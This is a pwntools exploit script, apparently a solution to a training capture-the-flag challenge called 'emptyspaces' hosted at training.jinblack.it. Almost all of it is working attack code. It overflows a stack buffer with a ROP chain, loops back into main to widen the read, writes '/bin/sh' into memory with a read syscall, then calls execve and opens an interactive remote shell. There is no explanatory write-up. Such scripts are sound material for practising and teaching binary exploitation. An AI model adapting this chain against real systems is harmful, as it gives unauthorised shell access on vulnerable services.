#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host training.jinblack.it --port 4006 emptyspaces
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('emptyspaces')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'training.jinblack.it'
port = int(args.PORT or 4006)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x0400c14
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

#    	rax	rdi			rsi			rdx
# read	0x00	unsigned int fd		char *buf		size_t count
# execv 0x3b	const char *name	const char *const *argv	const char *const *envp

rip_pos = 72
rip_pos_2 = 88

io = start()
input('start program...')

# pop rdi ; ret
# pop rsi ; ret
# syscall
# ret
payload_read = p64(0x400696) + p64(0) + p64(0x410133) + p64(0x6b6000) + p64(0x4497ba) + p64(0x400416)

print(len(payload_read))

# pop rdx ; ret
payload_main_expanded = p64(0x4497c5) + p64(0x1000)

# pop rax ; ret
# pop rdi ; ret
# pop rdx ; pop rsi ; ret
# syscall
payload_execve = p64(0x4155a4) + p64(0x3b) + p64(0x400696) + p64(0x6b6000) + p64(0x44bd59) + p64(0x6b6010) + p64(0x6b6010) + p64(0x40128c)
log.info('payload execve len = ' + str(len(payload_execve)))

# call main before read again
io.sendline(cyclic(rip_pos) + payload_main_expanded + p64(0x00400bf8))
sleep(1)
io.sendline(cyclic(rip_pos_2) + payload_read + payload_execve)
sleep(1)
io.send(b"/bin/sh\0")
sleep(1)
io.send(b"/bin/sh\0")
sleep(1)
io.send(b"/bin/sh\0")
sleep(1)
io.send(b"/bin/sh\0")
sleep(1)
io.send(b"/bin/sh\0")

io.interactive()

